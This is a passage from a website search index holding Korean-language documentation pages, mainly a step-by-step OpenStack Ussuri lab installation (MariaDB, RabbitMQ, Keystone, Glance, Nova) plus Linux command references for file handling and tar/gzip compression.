IP주소를 갖고 있어야함. / 모든 디스크 볼륨은 NTFS 파일 시스템을 사용.  "}),a.add({id:194,href:'/docs/openstack/openstacktraining/openstack-ussuri-01/',title:"OpenStack Ussuri : Overview",content:"OpenStack Ussuri : Overview  OpenStack Ussuri : Overview    OpenStack Ussuri 설치는 위의 그림과 표에 맞춰 설치가 진행됩니다. minimal 기본 설치는 keystone, glance, nova, neutron, cinder, horizon이며 여기서는 가능한 모든 서비스를 설치하도록 하겠습니다.      OS HOST NAME CPU/thead RAM DISK Network Interface-1 Network Interface-2      CentOS8 controller 4/8 6144 100G Nat host1    CentOS8 network 2/4 2048 40G Nat host1    CentOS8 compute 4/8 4096 40G   host1    CentOS8 storage1 1/2 1024 50G   host1    CentOS8 storage2 1/2 1024 50G   host1    CentOS8 storage3 1/2 1024 50G   host1         Service Code Name Description     Identity Service Keystone User Management   Compute Service Nova Virtual Machine Management   Image Service Glance Manages Virtual image like kernel image or disk image   Dashboard Horizon Provides GUI console via Web browser   Object Storage Swift Provides Cloud Storage   Block Storage Cinder Storage Management for Virtual Machine   Network Service Neutron Virtual Networking Management   Orchestration Service Heat Provides Orchestration function for Virtual Machine   Metering Service Ceilometer Provides the function of Usage measurement for accounting   Database Service Trove Database resource Management   Data Processing Service Sahara Provides Data Processing function   Bare Metal Provisioning Ironic Provides Bare Metal Provisioning function   Messaging Service Zaqar Provides Messaging Service function   Shared File System Manila Provides File Sharing Service   DNS Service Designate Provides DNS Server Service   Key Manager Service Barbican Provides Key Management Service      "}),a.add({id:195,href:'/docs/network/snort/',title:"Snort",content:"Sophos    Snort docs\n  Snort란?\n  Snort의 역할\n      "}),a.add({id:196,href:'/docs/openstack/openstack/sahara/',title:"Sahara",content:"Sahara   데이터 프로세싱 서비스 Sahara  오픈스택 위 빅데이터를 다루기 위한 Hadoop이나 Spark를 쉽게 제공할 수 있게 도와주는 서비스 Sahara는 다음 요소로 구성  Auth: 클라이언트 인증 및 권한을 부여, 오픈스택 인증 서비스 Keystone과 통신 DAL: Data Access Layer의 약어로 데이터 엑세스 계층을 의미, DB의 내부 모델을 유지 Secure Storage Access Layer: 암호 및 개인 키 같은 인증 데이터를 안전한 저장소에 보관 Provisioning Engine: 오픈스택 컴퓨트 서비스 Nova, Heat, Cinder, Glance, Designate와 통신을 담당하는 구성 요소 Vendor Plugins: 프로비저닝된 VM에서 데이터 처리 프레임워크를 구성하고 시작하는 기능을 담당하는 플러그 가능한 메커니즘 EDP: Elastic Data Processing의 약어로 Sahara가 제공하는 클러스테에서 데이터 처리 작업을 예약하고 관리 REST API: REST HTTP 인터페이스로 Sahara 기능을 호출 Python Sahara Client: 다른 오픈스택 구성 요소와 마찬가지로 Sahara에는 자체 Python 클라이언트가 있음 Sahara Pages: Sahara용 GUI로 오픈스택 대시보드인 Horizon에 있음    "}),a.add({id:197,href:'/docs/system/linux/linux02/',title:"Linux Filesystem",content:"Linux   Linux Filesystem   Filesystem은 각 파일들에 대한 관리를 다루는 명령어들입니다.      cd   cd는 디렉터리를 이동하는 명령어입니다.   주요 옵션     옵션 내용     . 현재위치   .. 상위 디렉토리   ~ 홈 디렉터리   - 이전 디렉토리   / 최상단(root) 디렉토리        cp   파일, 디렉터리를 복사하는 명령어입니다.   주요 옵션     옵션 내용     -f 같은 이름의 파일이 존재할 경우 확인하지 않고 덮어씁니다.   -i 같은 이름의 파일이 존재할 경우 확인합니다.   -R 디렉토리의 하위 파일들을 모두 복사합니다.        df   df는 파일시스템의 디스크 사용량을 표시하는 명령어입니다.   주요 옵션     옵션 내용     -a 모든 파일시스템을 표사   -h 사람이 읽을 수 있는 형태로 용량을 변환하여 표시   -T 파일 시스템의 타입을 표시        du   du는 파일과 디렉토리의 사용량을 표시하는 명령어입니다.   주요 옵션     옵션 내용     -b 바이트 단위로 표시   -k 킬로바이트 단위로 표시   -m 메가바이트 단위로 표시   -s 디스크 사용량의 합계를 표시   -h 사람이 보기 편한 형태로 표시        find   find 명령어는 파일을 검색할 때 사용합니다.   주요 옵션     옵션 내용     -name 검색할 이름을 지정 *도 사용가능   -exec 찾은 파일을 이용해서 다른 명령을 실행해야 할 때 사용   -mtime 수정시간을 이용하여 검색 n*24시간 전 수정파일   -type 찾는 파일의 타입을 지정     type 옵션     상태 내용     b 블록형 특수파일   c 캐릭터형 특수 파일   d 디렉토리 파일   f 일반 파일   I 심롤릭 링크 파일   p 파이프   s 소켓        ln    ln은 파일, 디렉토리에 대한 링크를 생성할 때 사용하며, -s 옵션을 이용하면 심볼릭 링크를 생성하고, 사용하지 않으면 하드링크를 생성합니다.\n  심볼릭 링크는 윈도우의 바로가기 파일과 동일한 역할을 수행하며, 원본 파일을 삭제할 경우 심볼릭 링크 또한 동작하지 않습니다.\n  하드 링크는 같은 파일을 하나 더 생성하여 연결된 개념으로 원본을 수정하면 하드링크의 파일도 함께 수정됩니다.\n   주요 옵션     옵션 내용     -s 심볼릭 링크 파일을 생생        ls   파일 엔트리(파일, 디렉토리) 정보를 표시합니다.   주요 옵션     옵션 내용     a 모든 파일 엔트리 정보를 표시   l 파일타입, 퍼미션, 하드링크 수, 오너, 그룹, 파일사이즈 등의 정보를 표시   R 하위의 모든 정보를 표시        mkdir   디렉토리를 생성하는 명령어입니다.   주요 옵션     옵션 내용     -p 지정된 경로가 존재하지 않으면 자동으로 생성합니다.        mv   파일, 디렉토리를 이동하는 명령어로 이름을 변경하는데도 사용합니다.   주요 옵션     옵션 내용     -f 같은 파일의 이름이 존재할 경우 확인하지 않고 덮어씁니다.   -i 같은 파일의 이름이 존재할 경우 확인합니다.     사용예제    상태 내용              rm   파일, 디렉토리를 삭제합니다.   주요 옵션     옵션 내용     -f 파일이 없는 경우에도 오류를 표시하지 않습니다.   -r 디렉토리를 삭제합니다.     "}),a.add({id:198,href:'/docs/network/',title:"Network",content:""}),a.add({id:199,href:'/docs/openstack/openstacktraining/openstack-ussuri-02/',title:"OpenStack Ussuri : 환경설정",content:"OpenStack Ussuri : 기본 환경설정   ----------------------- | [ Controller Node ] | | | | MariaDB RabbitMQ | | Memcached | -----------------------  OpenStack Ussuri : 기본 환경설정   앞 기본 환경설정을 모든 노드에서 진행한 후, DB, RabbitMQ, Memcached는 controller에서만 설치를 진행합니다.  $ all\u0026gt; $ controller\u0026gt; $ controller ~(keystone)\u0026gt; $ compute\u0026gt; $ network\u0026gt; # 위와 같은 호스트를 주의헤 주세요 ! # (keystone)은 keystone 설치 후 인증 받은 터미널입니다.  Ussuri repository 등록   OpenStack 구현을 위해 Ussuri repository를 구현합니다.  $ all\u0026gt; dnf -y install centos-release-openstack-ussuri $ all\u0026gt; sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-ussuri.repo $ all\u0026gt; dnf --enablerepo=centos-openstack-ussuri -y upgrade    NTP ( Network Time Protocol ) Server 설치   NTP Server는 모든 Node에서 설정을 진행합니다.  $ all\u0026gt; dnf --enablerepo=centos-openstack-ussuri -y install openstack-selinux # SELinux를 설치합니다. $ all\u0026gt; dnf install -y wget # wget을 설치합니다. $ all\u0026gt; dnf --enablerepo=PowerTools -y install epel-release # epel 레포지터리를 등록합니다. $ all\u0026gt; dnf --enablerepo=PowerTools -y install checkpolicy # 만약 Checkpolicy가 설치되어 있지 않으면, 패키지를 다운 받습니다. $ all\u0026gt; dnf -y install chrony $ all\u0026gt; vi /etc/chrony.conf # pool 2.centos.pool.ntp.org iburst pool ntp.nict.jp iburst allow 10.10.10.0/24 $ all\u0026gt; systemctl enable --now chronyd # chrony 파일을 수정합니다. allow에는 사용대역을 기입합니다. $ all\u0026gt; firewall-cmd --add-service=ntp --permanent $ all\u0026gt; firewall-cmd --reload $ all\u0026gt; init 6 $ all\u0026gt; chronyc sources ^+ ntp-k1.nict.jp 1 6 17 10 -588us[-2093us] +/- 28ms ^+ ntp-a3.nict.go.jp 1 6 17 10 -2468us[-3973us] +/- 30ms ^* ntp-b3.nict.go.jp 1 6 17 10 +1015us[ -490us] +/- 22ms ^- ntp-b2.nict.go.jp 1 6 17 10 +2720us[+2720us] +/- 22ms # 방화벽을 등록 후 확인합니다.    Controller MariaDB 설치  $ controller\u0026gt; dnf module -y install mariadb:10.3 $ controller\u0026gt; vi /etc/my.cnf.d/charaset.cnf [mysqld] character-set-server = utf8mb4 [client] default-character-set = utf8mb4 # mariadb를 설치 후, charaset 설정을 변경하기 위해 파일을 수정합니다. $ controller\u0026gt; systemctl restart --now mariadb $ controller\u0026gt; systemctl enable --now mariadb # DB를 재시작 합니다. $ controller\u0026gt; firewall-cmd --add-service=mysql --permanent $ controller\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다. $ controller\u0026gt; mysql_secure_installation $ controller\u0026gt; mysql -u root -p # 설정을 초기화 후, 비빌번호를 생성합니다.    RabbitMQ, Memcached 설치   RabbitMQ는 오픈 소스 메시지 브로커 소프트웨어이며, AMQP를 구현합니다. RabbitMQ는 OpenStack에서는 서로간의 통신을 위해 사용됩니다. Memcached이란 Memcached 는 범용 분산 캐시 시스템로, OpenStack에서 캐시값을 관리합니다. RabbitMq, Memcached는 Controller에서만 설치를 진행합니다.  $ controller\u0026gt; dnf --enablerepo=PowerTools -y install rabbitmq-server memcached $ controller\u0026gt; vi /etc/my.cnf.d/mariadb-server.cnf [mysqld] ..... ..... max_connections=500 # 인증허용 시간 값을 추가합니다. $ controller\u0026gt; vi /etc/sysconfig/memcached OPTIONS=\u0026#34;-l 0.0.0.0,::\u0026#34; # 모두가 사용할 수 있도록 값을 수정합니다. $ controller\u0026gt; systemctl restart mariadb rabbitmq-server memcached $ controller\u0026gt; systemctl enable mariadb rabbitmq-server memcached # RabbitMQ, Memcached 서비스를 등록합니다. $ controller\u0026gt; rabbitmqctl add_user openstack qwer1234 $ controller\u0026gt; rabbitmqctl set_permissions openstack \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; # rabbitmq를 사용할 openstack 유저를 패스워드 qwer1234로 생성하고 모든 권한을 줍니다. $ controller\u0026gt; vi rabbitmqctl.te module rabbitmqctl 1.0; require { type rabbitmq_t; type rabbitmq_var_log_t; type rabbitmq_var_lib_t; type etc_t; type init_t; class file write; class file getattr; } #============= rabbitmq_t ============== allow rabbitmq_t etc_t:file write; #============= init_t ================== allow init_t rabbitmq_var_lib_t:file getattr; allow init_t rabbitmq_var_log_t:file getattr; $ controller\u0026gt; checkmodule -m -M -o rabbitmqctl.mod rabbitmqctl.te $ controller\u0026gt; semodule_package --outfile rabbitmqctl.pp --module rabbitmqctl.mod $ controller\u0026gt; semodule -i rabbitmqctl.pp # rabbitmq의 설정을 추가 후 등록시킵니다. $ controller\u0026gt; firewall-cmd --add-service=memcache --permanent $ controller\u0026gt; firewall-cmd --add-port=5672/tcp --permanent $ controller\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다. "}),a.add({id:200,href:'/docs/openstack/openstack/ironic/',title:"Ironic",content:"Ironic   베어메탈 서비스 Ironic   물리적인 컴퓨터를 관리하고 자원을 제공하는 구성요소의 모음\n  Ironic은 구성에 따라 다음과 같은 다른 여러 오픈스택 서비스와 상호 작용할 수 있음\n  IPMI 메트릭을 사용하는 오픈스택 텔레미터 모듈(Ceilometer)\n  인증 요청 및 다른 오픈스택 서비스를 인증하는 오픈스택 인증 서비스(Keystone)\n  이미지 및 이미지 메타데이터를 검색할 수 있는 오픈스택 이미지 서비스(Glance)\n  DHCP 및 네트워크를 구성하는 오픈스택 네트워크 서비스(Neutron)\n  오픈스택 네트워크 서비스인 Nova는 베어메탈 서비스와 함꼐 작동하고, 인스턴스를 관리하는 사용자용 API를 제공\n  오픈스택 컴퓨트 서비스는 베어메탈 서비스가 제공하지 않는 예약 기능, 테넌트 할당량, IP 할당, 기타 서비스를 제공\n  오픈스택 오브젝트 스토리지 서비스인 Swift는 드라이브 설정, 사용자 이미지, 배포 로그 및 점검 데이터 임시 저장 장소를 제공\n  Ironic은 다음 요소로 구성\n  ironic-api: 응용프로그램 요청을 원격 프로시저 호출(RPC)을 이용해서 ironic-conductor로 전송한 후 응용프로그램 요청을 처리하는 RESTful API\n  ironic-conductor: 노드를 추가, 편집, 삭제하며 IPMI 또는 SSH를 사용해 노드를 켜고 끌수 있음, 베어메탈 노드를 프로비저닝, 배치 정리 수행\n  ironic-python-agent: 원격 엣세스, 하드웨어 제어, 하드웨어 기본 스펙으로 ironic-conductor 및 ironic-inspector 서비스를 제공하려고 임시 RAM 디스크에서 실행되는 python 서비스\n  "}),a.add({id:201,href:'/docs/system/linux/linux03/',title:"Linux 압축",content:"**Linux **   Linux 압축    Linux는 여러 압축포맷을 지원하며, 이를 통해 범용성있는 활용범위를 가지고 있습니다.\n  대표적인 사용예시로는 Linux는 압축을 통해 전체적인 백업 및 복구를 진행할 수 있습니다.\n      gzip, gunzip, zcat    gzip은 파일을 압축할 때 gunzip은 파일의 압축을 해제할 때 사용됩니다.\n  압축한 파일은 .gz의 확장자를 가지며, 파일, 디렉터리 단위로 압축되므로 여러 개의 파일을 압축하기 위해서는 tar 명령어를 사용합니다.\n   주요 옵션     옵션 내용     -r 디렉터리 압축   -d 압축을 해제, gunzip과 동일한 동작   -l 압축 정보를 표시   -c gzip 파일을 읽어 표준 출력으로 출력, zcat과 동일하게 동작        tar   tar은 여러 개의 파일을 모아 하나의 파일로 압축합니다.   주요 옵션     옵션 내용     -c 파일 묶음을 생성   -x 파일 묶음을 해제   -z 파일을 gzip 압축하면서 묶음을 생성   -v 처리 상황을 출력   -t 파일 묶음에 들어있는 파일 목록을 출력   \u0026ndash;exclude 파일 제외      사용예제  $ tar -cf archive.tar foo bar # foo, bar를 archive.tar로 만듬  $ tar -tf archive.tar # archive.tar 파일 안에 묶여 있는 내용을 확인 $ tar -zcvf archive.tar.gz foo bar # foo, bar를 gzip 압축하여 archive.tar.gz 으로 만듬  $ tar -zcvf file.tar.gz source_dir --exclude=\u0026#34;*.log\u0026#34; --exclude=\u0026#34;*.attach*\u0026#34; --exclude=\u0026#34;./folder_name\u0026#34; # source_dir의 .log, .attatch 로 끝나는 파일, folder_name 디렉토리 제외하고 file.tar.gz 으로 압축  $ tar -xf archive.tar # archive.tar 파일 묶음 해제  $ tar -zxvf archive.tar.gz # archive.tar.gz 압축 파일의 묶을 해제   "}),a.add({id:202,href:'/docs/openstack/openstacktraining/openstack-ussuri-03/',title:"OpenStack Ussuri : Keystone",content:"OpenStack Ussuri : Keystone   ----------------------- | [ Controller Node ] | | | | MariaDB RabbitMQ | | Memcached Keystone | | httpd | -----------------------  OpenStack Ussuri : Keystone   Keystone은 OpenStack에서 인증 서비스를 구성하고 있습니다. Keystone에 대한 자세한 설명은 Keystone을 참조해주세요.   Keystone 유저와 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database keystone; $ MariaDB\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Keystone을 설치합니다.  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,epel,PowerTools -y install openstack-keystone python3-openstackclient httpd mod_ssl python3-mod_wsgi python3-oauth2client # keystone 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/keystone/keystone.conf [cache] memcache_servers = controller:11211 [database] connection = mysql+pymysql://keystone:qwer1234@controller/keystone [token] provider = fernet $ controller\u0026gt; su -s /bin/bash keystone -c \u0026#34;keystone-manage db_sync\u0026#34; $ controller\u0026gt; keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone $ controller\u0026gt; keystone-manage credential_setup --keystone-user keystone --keystone-group keystone # Keystone DB를 임포트 시킵니다. $ controller\u0026gt; keystone-manage bootstrap --bootstrap-password qwer1234 \\ --bootstrap-admin-url http://controller:5000/v3/ \\ --bootstrap-internal-url http://controller:5000/v3/ \\ --bootstrap-public-url http://controller:5000/v3/ \\ --bootstrap-region-id RegionOne $ controller\u0026gt; setsebool -P httpd_use_openstack on $ controller\u0026gt; setsebool -P httpd_can_network_connect on $ controller\u0026gt; setsebool -P httpd_can_network_connect_db on $ controller\u0026gt; vi keystone-httpd.te module keystone-httpd 1.0; require { type httpd_t; type keystone_log_t; class file create; class dir { add_name write }; } #============= httpd_t ============== allow httpd_t keystone_log_t:dir { add_name write }; allow httpd_t keystone_log_t:file create; $ controller\u0026gt; checkmodule -m -M -o keystone-httpd.mod keystone-httpd.te $ controller\u0026gt; semodule_package --outfile keystone-httpd.pp --module keystone-httpd.mod $ controller\u0026gt; semodule -i keystone-httpd.pp $ controller\u0026gt; firewall-cmd --add-port=5000/tcp --permanent $ controller\u0026gt; firewall-cmd --reload # 방화벽 및 SELinux를 설정합니다. $ controller\u0026gt; vi /etc/httpd/conf/httpd.conf ServerName controller:80 # 99번 줄에 추가합니다. $ controller\u0026gt; ln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/ $ controller\u0026gt; systemctl enable --now httpd # httpd 서비스를 등록합니다.    Keystone Project 생성 $ controller\u0026gt; vi ~/admin_key export OS_PROJECT_DOMAIN_NAME=default export OS_USER_DOMAIN_NAME=default export OS_PROJECT_NAME=admin export OS_USERNAME=admin export OS_PASSWORD=qwer1234 export OS_AUTH_URL=http://controller:5000/v3 export OS_IDENTITY_API_VERSION=3 export OS_IMAGE_API_VERSION=2 export PS1=\u0026#39;[\\u@\\h \\W~(keystone)]\\$ \u0026#39; $ controller\u0026gt; chmod 600 ~/admin_key $ controller\u0026gt; source ~/admin_key $ controller\u0026gt; echo \u0026#34;source ~/admin_key \u0026#34; \u0026gt;\u0026gt; ~/.bash_profile # keystone 인증파일 생성 후 시작시 등록되게 등록시킵니다. $ controller ~(keystone)\u0026gt; openstack project create --domain default --description \u0026#34;Service Project\u0026#34; service +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Service Project | | domain_id | default | | enabled | True | | id | 7c10c02365be496fb47f12bfd40fe4a7 | | is_domain | False | | name | service | | options | {} | | parent_id | default | | tags | [] | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack project list +----------------------------------+---------+ | ID | Name | +----------------------------------+---------+ | 7c10c02365be496fb47f12bfd40fe4a7 | service | | c76211c24a1f460ca67274d655d46725 | admin | +----------------------------------+---------+   "}),a.add({id:203,href:'/docs/openstack/openstacktraining/openstack-ussuri-04/',title:"OpenStack Ussuri : Glance",content:"OpenStack Ussuri : Glance  ----------------------- | [ Controller Node ] | | | | MariaDB RabbitMQ | | Memcached Keystone | | httpd Glance | -----------------------  OpenStack Ussuri : Glance   Glance는 OpenStack에서 이미지 생성에 필요한 Iamge 관리 서비스를 구성하고 있습니다. Glance에 자세한 설명은 Glance를 참조해주세요.   Glance service 및 User 생성 $ contoller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 glance +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 | | domain_id | default | | enabled | True | | id | 03f5b16a7be84cb688617d1943c8fe8c | | name | glance | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ contoller ~(keystone)\u0026gt; openstack role add --project service --user glance admin $ contoller ~(keystone)\u0026gt; openstack service create --name glance --description \u0026#34;OpenStack Image service\u0026#34; image +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Image service | | enabled | True | | id | af365771c17a4a25ae1d0c659e2dc0eb | | name | glance | | type | image | +-------------+----------------------------------+ $ contoller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne image public http://controller:9292 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | cc65faecd7b042ffafd0f262cd7547df | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | af365771c17a4a25ae1d0c659e2dc0eb | | service_name | glance | | service_type | image | | url | http://controller:9292 | +--------------+----------------------------------+ $ contoller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne image internal http://controller:9292 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | ea41c7b17c844e658ac83c547eddcf6d | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | af365771c17a4a25ae1d0c659e2dc0eb | | service_name | glance | | service_type | image | | url | http://controller:9292 | +--------------+----------------------------------+ $ contoller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne image admin http://controller:9292 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 1393a64ef0ec428ba437602ac5b390f6 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | af365771c17a4a25ae1d0c659e2dc0eb | | service_name | glance | | service_type | image | | url | http://controller:9292 | +--------------+----------------------------------+    Glance 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database glance; $ MariaDB\u0026gt; grant all privileges on glance.* to glance@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on glance.* to glance@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Glance 설치 $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-glance # Glacne 및 관련 모듈을 설치합니다. $ controller\u0026gt; vi /etc/glance/glance-api.conf [DEFAULT] bind_host = 0.0.0.0 [glance_store] stores = file,http default_store = file filesystem_store_datadir = /var/lib/glance/images/ [database] connection = mysql+pymysql://glance:qwer1234@controller/glance [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = glance password = qwer1234 [paste_deploy] flavor = keystone # glacne 파일을 수정합니다. $ controller\u0026gt; su -s /bin/bash glance -c \u0026#34;glance-manage db_sync\u0026#34; $ controller\u0026gt; systemctl enable --now openstack-glance-api # Glance DB를 임포트 시킨후 서비스를 등록합니다.  $ controller\u0026gt; setsebool -P glance_api_can_network on $ controller\u0026gt; vi glanceapi.te module glanceapi 1.0; require { type glance_api_t; type httpd_config_t; type iscsid_exec_t; class dir search; class file { getattr open read }; } #============= glance_api_t ============== allow glance_api_t httpd_config_t:dir search; allow glance_api_t iscsid_exec_t:file { getattr open read }; $ controller\u0026gt; checkmodule -m -M -o glanceapi.mod glanceapi.te $ controller\u0026gt; semodule_package --outfile glanceapi.pp --module glanceapi.mod $ controller\u0026gt; semodule -i glanceapi.pp $ controller\u0026gt; firewall-cmd --add-port=9292/tcp --permanent $ controller\u0026gt; firewall-cmd --reload    Glance Image 생성  $ controller ~(keystone)\u0026gt; mkdir -p /var/kvm/images $ controller ~(keystone)\u0026gt; wget http://download.cirros-cloud.net/0.5.1/cirros-0.5.1-x86_64-disk.img # 이미지를 다운받습니다. $ controller ~(keystone)\u0026gt; openstack image create \u0026#34;cirros\u0026#34; --file cirros-0.5.1-x86_64-disk.img --disk-format qcow2 +------------------+------------------------------------------------------------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -+ | Field | Value | +------------------+------------------------------------------------------------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -+ | checksum | 1d3062cd89af34e419f7100277f38b2b | | container_format | bare | | created_at | 2020-08-06T11:08:39Z | | disk_format | qcow2 | | file | /v2/images/dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16/file | | id | dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16 | | min_disk | 0 | | min_ram | 0 | | name | Cirros | | owner | c76211c24a1f460ca67274d655d46725 | | properties | os_hash_algo=\u0026#39;sha512\u0026#39;, os_hash_value=\u0026#39;553d220ed58cfee7dafe0 03c446a9f197ab5edf8ffc09396c74187cf83873c877e7ae041cb80f3b91489acf687183adcd689b 53b38e3ddd22e627e7f98a09c46\u0026#39;, os_hidden=\u0026#39;False\u0026#39;, owner_specified.openstack.md5=\u0026#39; 1d3062cd89af34e419f7100277f38b2b\u0026#39;, owner_specified.openstack.object=\u0026#39;images/Cirr os\u0026#39;, owner_specified.openstack.sha256=\u0026#39;c4110030e2edf06db87f5b6e4efc27300977683d5 3f040996d15dcc0ad49bb5a\u0026#39;, self=\u0026#39;/v2/images/dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16\u0026#39; | | protected | False | | schema | /v2/schemas/image | | size | 16338944 | | status | active | | tags | | | updated_at | 2020-08-06T11:08:39Z | | visibility | shared | +------------------+------------------------------------------------------------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- -+ # 이미지를 등록합니다. $ controller ~(keystone)\u0026gt; openstack image list +--------------------------------------+--------+--------+ | ID | Name | Status | +--------------------------------------+--------+--------+ | dc7c2474-8ec9-4f74-a1c3-7cf6a9ad3d16 | Cirros | active | +--------------------------------------+--------+--------+ # 이미지를 확인합니다.   "}),a.add({id:204,href:'/docs/system/',title:"System",content:""}),a.add({id:205,href:'/docs/database/',title:"Database",content:""}),a.add({id:206,href:'/docs/openstack/openstacktraining/openstack-ussuri-05/',title:"OpenStack Ussuri : Nova",content:"OpenStack Ussuri : Nova  ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | | | Libvirt | | MariaDB RabbitMQ | | Nova-compute | | Memcached Keystone | | Open vSwitch | | httpd nova | | L2 Agent | | Nova-API | ----------------------- -----------------------  OpenStack Ussuri : Nova   Nova는 OpenStack에서 인스턴스를 생성하는 서비스입니다. Nova에 대한 자세한 설명은 Nova를 참조해주세요.     Nova, ceilometer service 및 User 생성  $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 nova +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 | | domain_id | default | | enabled | True | | id | f26027517d5e4b5b984b5db8d42398c8 | | name | nova | | options | {} | | qwer1234_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 placement +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 | | domain_id | default | | enabled | True | | id | 2394500b4512456f9d9d5066a5ecb1f7 | | name | placement | | options | {} | | qwer1234_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user nova admin $ controller ~(keystone)\u0026gt; openstack role add --project service --user placement admin $ controller ~(keystone)\u0026gt; openstack service create --name nova --description \u0026#34;OpenStack Compute service\u0026#34; compute +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Compute service | | enabled | True | | id | 28d495eca718439f9dc6ce395e0720dc | | name | nova | | type | compute | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack service create --name placement --description \u0026#34;OpenStack Compute Placement service\u0026#34; placement +-------------+-------------------------------------+ | Field | Value | +-------------+-------------------------------------+ | description | OpenStack Compute Placement service | | enabled | True | | id | 8515d3d046834de9b71b2938aae89898 | | name | placement | | type | placement | +-------------+-------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne compute public http://controller:8774/v2.1/%\\(tenant_id\\)s --------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | f13ca97a20eb46a3a1c1dfab546a00cc | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 28d495eca718439f9dc6ce395e0720dc | | service_name | nova | | service_type | compute | | url | http://controller:8774/v2.1/%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne compute internal http://controller:8774/v2.1/%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | 1bc41c829f2f47e7962cba46f0da8ddc | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 28d495eca718439f9dc6ce395e0720dc | | service_name | nova | | service_type | compute | | url | http://controller:8774/v2.1/%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne compute admin http://controller:8774/v2.1/%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | 8022a415f22c400c92989320a2be3133 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 28d495eca718439f9dc6ce395e0720dc | | service_name | nova | | service_type | compute | | url | http://controller:8774/v2.1/%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne placement public http://controller:8778 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 5e988f2be72242f0b3923e27e9db009c | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 8515d3d046834de9b71b2938aae89898 | | service_name | placement | | service_type | placement | | url | http://controller:8778 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne placement internal http://controller:8778 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | a68cf8b6eeb043c2aa1ec95d7711cb50 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 